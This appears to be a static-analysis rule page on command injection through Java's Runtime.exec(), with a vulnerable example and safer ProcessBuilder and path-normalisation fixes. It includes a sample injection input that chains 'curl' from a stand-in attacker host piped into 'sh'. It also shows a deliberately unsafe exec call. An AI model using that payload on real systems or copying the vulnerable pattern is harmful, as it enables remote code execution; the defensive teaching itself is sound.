# Audit: `Runtime.exec()` call may be susceptible to injection attacks
**ID:** `JAVA-A1057` | **Link:** [DeepSource](https://deepsource.com/directory/java/issues/JAVA-A1057)

![Critical](https://img.shields.io/badge/severity-critical-red)![Security](https://img.shields.io/badge/type-security-red)

Avoid calling any of [`Runtime.exec()`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/Runtime.html#exec(java.lang.String))'s overloads using data from an external source without first performing some kind of sanitization.

This issue will be reported if the Java analyzer sees use of `Runtime.exec()` with external input such as from a request or from a socket.


## Bad Practice

```java
String imagesPath=String.format("/home/%s/images",request.getParameter("userId")); // Tainted!

String imageListCmd=String.format("ls -lah %s",imagesPath);

Runtime.getRuntime().exec(imageListCmd); // Vulnerable!
```
It may be possible to use a malicious input such as the one below, to change the content of the command.


```java
"someUser/images && curl https://bad.evil.com | sh #"
```
The input above would execute whatever gets downloaded from the domain `bad.evil.com`, and the result could result in a virus or ransomware installing itself into your machine!


## Recommended
Use Java's [ProcessBuilder](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/ProcessBuilder.html) API instead. It provides a clean, builder based API whose behavior is easier to customise and control.

Additionally, all arguments passed via `ProcessBuilder` will be properly escaped, so that it is impossible to change the functionality of the command.


```java
ProcessBuilder pb = new ProcessBuilder("myCommand","myArg1","myArg2");
```
One other precaution to take is to check paths after normalising them, instead of directly concatenating strings to form paths. This will prevent relative path traversal attacks from occurring.


```java
String imagesPathStr = String.format("/home/%s/images",request.getParameter("userId"));

// This path no longer contains surprise components such as `..` or `.`
String normalizedPath = new File(imagesPathStr).getCanonicalPath();
```
You could also use the `Path` API to do the same thing (beware of any exceptions this may throw):


```java
String normalizedPath = Path.of(imagesPathStr).toAbsolutePath().toString();
```
